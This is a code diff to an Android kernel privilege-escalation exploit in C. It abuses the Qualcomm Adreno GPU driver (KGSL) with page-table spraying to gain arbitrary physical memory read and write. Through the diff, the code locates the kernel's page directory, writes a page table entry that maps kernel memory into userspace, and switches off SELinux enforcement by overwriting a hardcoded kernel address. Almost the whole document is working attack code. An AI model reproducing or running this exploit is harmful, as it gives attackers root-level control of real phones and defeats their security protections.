@@ -10,6 +10,8 @@
 #include <errno.h>
 #include "adrenaline.h"
 #include <string.h>
+#include <stdbool.h>
+#include <sys/wait.h>
 
 #define KGSL_MEMFLAGS_IOCOHERENT 0x80000000ULL
 
@@ -114,7 +116,8 @@ int kgsl_gpu_command_payload(int fd, uint32_t ctx_id, uint64_t gpuaddr, uint32_t
 
 // TODO(zhuowei): make 2G spray configurable; should be ~1/4 to 1/2 of RAM
 // increased this from 1G to 2G for Pixel 3 XL
-#define NPBUFS 192
+// spray 16mb per mapping: 16MB*256=4GB
+#define NPBUFS 256
 
 #define LEVEL1_SHIFT    30
 #define LEVEL1_MASK     (0x1fful << LEVEL1_SHIFT)
@@ -175,6 +178,47 @@ int setup_pagetables(uint8_t *tt0, uint32_t pages, uint32_t tt0phys, uint64_t fa
     return 0;
 }
 
+// From Mesa/Freedreno/Turnip
+
+static inline void
+tu_sync_cacheline_to_gpu(void const *p __attribute__((unused)))
+{
+   /* Clean data cache. */
+   __asm volatile("dc cvac, %0" : : "r" (p) : "memory");
+}
+
+static inline void
+tu_sync_cacheline_from_gpu(void const *p __attribute__((unused)))
+{
+   /* Clean and Invalidate data cache, there is no separate Invalidate. */
+   __asm volatile("dc civac, %0" : : "r" (p) : "memory");
+}
+
+uint32_t
+tu_get_l1_dcache_size()
+{
+   /* Bionic does not implement _SC_LEVEL1_DCACHE_LINESIZE properly: */
+   uint64_t ctr_el0;
+   asm("mrs\t%x0, ctr_el0" : "=r"(ctr_el0));
+   return 4 << ((ctr_el0 >> 16) & 0xf);
+}
+
+static uint64_t g_level1_dcache_size;
+
+static void sync_cache_to_gpu(void* start, void* end) {
+    start = (char *) ((uintptr_t) start & ~(g_level1_dcache_size - 1));
+    for (; start < end; start += g_level1_dcache_size) {
+        tu_sync_cacheline_to_gpu(start);
+    }
+}
+
+static void sync_cache_from_gpu(void* start, void* end) {
+    start = (char *) ((uintptr_t) start & ~(g_level1_dcache_size - 1));
+    for (; start < end; start += g_level1_dcache_size) {
+        tu_sync_cacheline_from_gpu(start);
+    }
+}
+
 // #define DUMP_PAGEMAP
 #ifdef DUMP_PAGEMAP
 // https://github.com/NEWBEE108/linux_kernel_module_Info/blob/master/kernel_module/user/pagemap_dump.c
@@ -219,7 +263,7 @@ struct cheese_gpu_rw {
 const uint64_t kFakeGpuAddr = 0x40403000;
 const uint64_t kGarbageSize = 16 * 1024 * 1024;
 
-static int DoWrite(int fd, int ctx_id, uint32_t* payload_buf, uint64_t payload_gpuaddr, uint64_t phyaddr, uint64_t completion_marker_write_addr, uint64_t write_addr, uint32_t count, uint32_t* values) {
+static int DoWrite(int fd, int ctx_id, uint32_t* payload_buf, uint64_t payload_gpuaddr, uint64_t phyaddr, uint64_t completion_marker_write_addr, bool write, uint64_t write_addr, uint32_t count, uint32_t* values) {
     uint32_t* drawstate_buf = payload_buf + 0x100;
     uint64_t drawstate_gpuaddr = payload_gpuaddr + 0x100*sizeof(uint32_t);
     uint32_t* drawstate_cmds = drawstate_buf;
@@ -229,10 +273,18 @@ static int DoWrite(int fd, int ctx_id, uint32_t* payload_buf, uint64_t payload_g
     *drawstate_cmds++ = 0;
     drawstate_cmds += cp_wait_for_me(drawstate_cmds);
     drawstate_cmds += cp_wait_for_idle(drawstate_cmds);
-    *drawstate_cmds++ = cp_type7_packet(CP_MEM_WRITE, 2 + count);
-    drawstate_cmds += cp_gpuaddr(drawstate_cmds, write_addr);
-    for (int i = 0; i < count; i++) {
-        *drawstate_cmds++ = values[i];
+    if (write) {
+        *drawstate_cmds++ = cp_type7_packet(CP_MEM_WRITE, 2 + count);
+        drawstate_cmds += cp_gpuaddr(drawstate_cmds, write_addr);
+        for (int i = 0; i < count; i++) {
+            *drawstate_cmds++ = values[i];
+        }
+    } else {
+        // only support one 32-bit read for now...
+        *drawstate_cmds++ = cp_type7_packet(CP_MEM_TO_MEM, 5);
+        *drawstate_cmds++ = 0;
+        drawstate_cmds += cp_gpuaddr(drawstate_cmds, completion_marker_write_addr + 4);
+        drawstate_cmds += cp_gpuaddr(drawstate_cmds, write_addr);
     }
     *drawstate_cmds++ = cp_type7_packet(CP_MEM_WRITE, 3);
     drawstate_cmds += cp_gpuaddr(drawstate_cmds, completion_marker_write_addr);
@@ -261,7 +313,7 @@ static int DoWrite(int fd, int ctx_id, uint32_t* payload_buf, uint64_t payload_g
     }
     fprintf(stderr, "\n");
 #endif
-    usleep(500000);
+    sync_cache_to_gpu((void*)payload_buf, ((void*)payload_buf) + 0x1000);
     // we don't need Adrenaline's multiple IB stuff - we just use it to run one IB
     // see https://github.com/github/securitylab/blob/105618fc1fa83c08f4446749e64310b539cb0262/SecurityExploits/Android/Qualcomm/CVE_2022_25664/adreno_kernel/adreno_kernel.c#L188
     int err = kgsl_gpu_command_payload(fd, ctx_id, /*gpuaddr=*/0, /*cmd_size=*/0, /*n=*/1, /*target_idx=*/0, payload_gpuaddr, cmd_size);
@@ -279,21 +331,20 @@ int cheese_gpu_rw_setup(struct cheese_gpu_rw* cheese) {
     int pagemap_fd = getuid() == 0? open("/proc/self/pagemap", O_RDONLY): -1;
 #endif
 
-    // crosshatch-rq1a.201205.003.a1
-    // /proc/iomem:
-    // 80080000-823fffff : Kernel code
-    // 82c00000-83885fff : Kernel data
+    // strings - xbl_config.img |grep Kernel
+    // 0xA8000000, 0x10000000, "Kernel",            AddMem, SYS_MEM, SYS_MEM_CAP, Reserv, WRITE_BACK_XN
     // https://www.longterm.io/cve-2020-0423.html
     // https://github.com/LineageOS/android_kernel_google_msm-4.9/blob/cf7420326fc9659917177acb536a2a9a8bf65bfc/arch/arm64/kernel/vmlinux.lds.S#L236
     // https://duasynt.com/blog/android-pgd-page-tables
     // https://docs.kernel.org/arch/arm64/booting.html
     // kernel physical base + image_size - 0x1000 (tramp_pg_dir)
-    // Note that Pixel 3 XL has CONFIG_UNMAP_KERNEL_AT_EL0 for Meltdown mitigation:
-    // Pixel 4a (in duasynt.com) does not - that's why we target tramp_pg_dir instead of swapper_pg_dir
     // https://developer.arm.com/-/media/Arm%20Developer%20Community/PDF/Kernel_Mitigations_Detail_v1.5.pdf?revision=a8859ae4-5256-47c2-8e35-a2f1160071bb&la=en
     // https://conference.hitb.org/hitbsecconf2019ams/materials/D2T2%20-%20Binder%20-%20The%20Bridge%20to%20Root%20-%20Hongli%20Han%20&%20Mingjian%20Zhou.pdf
-    uint64_t tramp_pg_dir_phys = 0x80080000ull + 0x3806000ull - 0x1000ull;
-    uint64_t target_write_physical_address = tramp_pg_dir_phys + (kKernelPageTableEntry * sizeof(uint64_t));
+    uint64_t kernel_physical_memory_region = 0xA8000000;
+    //uint64_t swapper_pg_dir_phys = kernel_physical_memory_region + kernel_load_offset - 0x2000ull;
+    //uint64_t target_write_physical_address = tramp_pg_dir_phys + (kKernelPageTableEntry * sizeof(uint64_t));
+    uint64_t kernel_read_offset = 0x4; // read the first jump to see how large the kernel is in memory
+    uint64_t target_read_physical_address = kernel_physical_memory_region + kernel_read_offset;
     uint64_t tramp_pte_target = 0x80000000;
     // that page has 0x00e8000000000751, which is:
     // https://developer.arm.com/documentation/101811/0104/Controlling-address-translation-Translation-table-format
@@ -310,8 +361,9 @@ int cheese_gpu_rw_setup(struct cheese_gpu_rw* cheese) {
     // pxn=1 << 53 ??
     // uxn=1 << 54
     // nonSecure = 1 << 55
-    // so we want MT_NORMAL_NC, so 0xe800000000074d
-    uint64_t tramp_pte_value = tramp_pte_target | 0xe800000000074d;
+    // so we want MT_NORMAL on 5.10, which has index 0, so 0xe8000000000751
+    uint64_t tramp_pte_value = tramp_pte_target | 0xe8000000000751;
+    //uint64_t tramp_pte_value = 0x41414141;
 
     // from Adrenaline: spray physical memory
     /* this is the physical address of the fake page table that we will point the SMMU TTBR0 to.
@@ -343,7 +395,7 @@ int cheese_gpu_rw_setup(struct cheese_gpu_rw* cheese) {
          * a fixed physical address that you can calculate by taking the base of "Kernel Code"
          * from /proc/iomem and then adding (sys_call_table - _text) from /proc/kallsyms */
         // zhuowei: actually, try to write to itself, please...
-        int ret = setup_pagetables(pbuf, pbuf_len/4096, phyaddr, kFakeGpuAddr, target_write_physical_address & ~0xfffull);
+        int ret = setup_pagetables(pbuf, pbuf_len/4096, phyaddr, kFakeGpuAddr, target_read_physical_address & ~0xfffull);
 
         if (ret == -1) {
             fprintf(stderr, "setup_pagetables failed\n");
@@ -360,6 +412,7 @@ int cheese_gpu_rw_setup(struct cheese_gpu_rw* cheese) {
             }
         }
 #endif
+        sync_cache_to_gpu((void*)pbuf, ((void*)pbuf) + pbuf_len);
     }
     // end spray
     //fprintf(stderr, "end spray\n");
@@ -405,16 +458,10 @@ int cheese_gpu_rw_setup(struct cheese_gpu_rw* cheese) {
         return 1;
     }
 
-    void* garbage = malloc(kGarbageSize);
-    // really stupid cache flush:
-    memset(garbage, 0x1, kGarbageSize);
-
-    if (DoWrite(fd, ctx_id, payload_buf, payload_gpuaddr, phyaddr, kFakeGpuAddr + 0x1100, kFakeGpuAddr + (target_write_physical_address & 0xfffull), 2, (uint32_t*)&tramp_pte_value)) {
-        fprintf(stderr, "Can't do initial write\n");
-        return 1;
+    if (DoWrite(fd, ctx_id, payload_buf, payload_gpuaddr, phyaddr, kFakeGpuAddr + 0x1100, /*write=*/false, kFakeGpuAddr + (target_read_physical_address & 0xfffull), 1, NULL)) {
+        fprintf(stderr, "Can't do first read\n");
     }
     sleep(1);
-    memset(garbage, 0x1, kGarbageSize);
 
     void* target_physical_page = NULL;
     int target_pbuf = -1;
@@ -423,6 +470,7 @@ int cheese_gpu_rw_setup(struct cheese_gpu_rw* cheese) {
         void* pbuf = pbufs[i];
         for (int off = 0; off < pbuf_len; off += 4096) {
             void* page_start = pbuf + off;
+            sync_cache_from_gpu((void*)page_start, ((void*)page_start) + 0x1000);
             uint32_t* target = page_start + 0x100;
             if (target[0] == 0x41414141) {
                 fprintf(stderr, "found it: virt addr = %p\n", page_start);
@@ -436,6 +484,35 @@ int cheese_gpu_rw_setup(struct cheese_gpu_rw* cheese) {
         fprintf(stderr, "can't find target\n");
         return 1;
     }
+
+    uint32_t read_output = *(uint32_t*)(target_physical_page + 0x104);
+    fprintf(stderr, "read output: %x\n", read_output);
+
+    if (read_output == 0) {
+        fprintf(stderr, "can't find kernel entry at %lx\n", target_read_physical_address);
+        return 1;
+    }
+
+    // https://developer.arm.com/documentation/ddi0596/2020-12/Index-by-Encoding/Branches--Exception-Generating-and-System-instructions
+    uint32_t branch_off = read_output & ((1 << 26) - 1);
+    uint64_t kernel_entry_file_off = kernel_read_offset + (branch_off << 2);
+    fprintf(stderr, "kernel entry = %lx\n", kernel_physical_memory_region + kernel_entry_file_off);
+    uint64_t swapper_pg_dir_physical_address = kernel_physical_memory_region + kernel_entry_file_off - 0x2000;
+    uint64_t target_write_physical_address = swapper_pg_dir_physical_address + (kKernelPageTableEntry * sizeof(uint64_t));
+
+    fprintf(stderr, "writing: %lx = %lx\n", target_write_physical_address, tramp_pte_value);
+
+    if (setup_pagetables(target_physical_page, 1, phyaddr, kFakeGpuAddr, target_write_physical_address & ~0xfffull)) {
+        return 1;
+    }
+    if (DoWrite(fd, ctx_id, payload_buf, payload_gpuaddr, phyaddr, kFakeGpuAddr + 0x1100, /*write=*/true, kFakeGpuAddr + (target_write_physical_address & 0xfffull), 2, (uint32_t*)&tramp_pte_value)) {
+        fprintf(stderr, "Can't do second write\n");
+        return 1;
+    }
+    sleep(1);
+    sync_cache_from_gpu(target_physical_page, target_physical_page + 0x1000);
+    uint32_t second_write_sentinel = *(uint32_t*)(target_physical_page + 0x100);
+    fprintf(stderr, "second write sentinel: %x\n", second_write_sentinel);
 
     // we don't need these anymore...
     for (int i = 0; i < NPBUFS; i++) {
@@ -451,6 +528,7 @@ int cheese_gpu_rw_setup(struct cheese_gpu_rw* cheese) {
     return 0;
 }
 
+#if 0
 int cheese_physwrite(struct cheese_gpu_rw* cheese, uint64_t target_write_physical_address, uint32_t count, uint32_t* values) {
     if (setup_pagetables(cheese->target_physical_page, 1, cheese->phyaddr, kFakeGpuAddr, target_write_physical_address & ~0xfffull)) {
         return 1;
@@ -474,6 +552,7 @@ int cheese_physwrite(struct cheese_gpu_rw* cheese, uint64_t target_write_physica
     }
     return 1;
 }
+#endif
 
 int cheese_shutdown(struct cheese_gpu_rw* cheese) {
     int err = kgsl_ctx_destroy(cheese->fd, cheese->ctx_id);
@@ -487,16 +566,40 @@ int cheese_shutdown(struct cheese_gpu_rw* cheese) {
 }
 
 int main() {
+    g_level1_dcache_size = tu_get_l1_dcache_size();
+#if 1
     struct cheese_gpu_rw cheese = {};
     if (cheese_gpu_rw_setup(&cheese)) {
         fprintf(stderr, "can't get GPU r/w\n");
         return 1;
     }
-    sleep(5);
+#endif
     // now check ksma...
     fprintf(stderr, "about to ksma...\n");
     void* ksma_mapping = (void*)(0xffffff8000000000ull + kKernelPageTableEntry * 0x40000000ull);
-    uint32_t* mytarget = ksma_mapping + 0x80000 /* kernel */ + 0x38 /* kernel header magic: ARMd */;
-    fprintf(stderr, "%x\n", *mytarget);
+    uint64_t ksma_physical_base = 0x80000000;
+    //sync_cache_from_gpu(ksma_mapping + 0x08000000, ksma_mapping + 0x08000000 + 0x1000);
+    uint32_t* mytarget = ksma_mapping - ksma_physical_base + 0xa8000000 + 0x38 /* kernel header magic: ARMd */;
+    fprintf(stderr, "%p=%x\n", mytarget, *mytarget);
+    uint64_t* kernel_size_ptr = ksma_mapping - ksma_physical_base + 0xa8000000 + 0x10 /* kernel header: size */;
+    uint64_t kernel_size = *kernel_size_ptr;
+    void* kernel_physical_base = ksma_mapping - ksma_physical_base + 0xa8000000;
+
+#if 0
+    void* kernel_copy_buf = malloc(kernel_size);
+    memcpy(kernel_copy_buf, kernel_physical_base, kernel_size);
+    FILE* f = fopen("/data/local/tmp/kernel_dump", "w");
+    fwrite(kernel_copy_buf, 1, kernel_size, f);
+    fclose(f);
+    // now run something like vmlinux-to-elf/kallsyms-finder to get...
+#endif
+    // TODO(zhuowei): this is dumped from vmlinux-to-elf/kallsyms-finder on my computer and is specific to 51052260106700520 - need to auto detect this
+    uint64_t kernel_virtual_base = 0xffffffdc8b200000ull;
+    uint64_t kernel_selinux_state_addr = 0xffffffdc8dc02840ull;
+    bool* kernel_selinux_state_enforcing_ptr = kernel_physical_base + (kernel_selinux_state_addr - kernel_virtual_base);
+    fprintf(stderr, "%lx: %p\n", (kernel_selinux_state_addr - kernel_virtual_base), kernel_selinux_state_enforcing_ptr);
+    *kernel_selinux_state_enforcing_ptr = false;
+    // TODO(zhuowei): takes a second for it to take effect - need to flush CPU cache? or maybe need to map ksma with cache enabled?
+
     return 0;
 }
